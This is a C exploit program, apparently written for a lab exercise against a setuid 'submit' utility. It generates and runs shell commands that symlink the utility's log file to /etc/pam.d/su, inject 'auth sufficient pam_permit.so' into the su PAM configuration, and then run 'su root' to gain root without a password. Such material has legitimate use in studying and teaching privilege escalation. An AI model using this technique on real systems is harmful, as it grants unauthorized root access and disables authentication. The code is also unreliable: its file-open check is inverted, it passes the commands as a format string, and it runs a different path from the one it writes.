#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "shellcode.h"
#include "errno.h"

#define TARGET "/usr/local/bin/submit"

int main(void)
{
  FILE *fp;
  char* commands = "cd /etc/pam.d\n"
                   "cp su /home/user/su\n"
                   "submit su byesu\n"
                   "cd /home/user\n"
                   "rm submit.log\n"
                   "ln -s /etc/pam.d/su submit.log\n"
                   "touch tmp.txt\n"
                   "submit tmp.txt \"auth sufficient pam_permit.so\"\n"
                   "cat su >> /etc/pam.d/su\n"
                   "su root";

  fp = fopen("/share/steps", "w");
  if (fp) {
    printf("Error, unable to open file.");
  }

  fprintf(fp, commands);
  fclose(fp);
  chmod("/share/steps", 0777);

  system("./steps");
  exit(0);
}
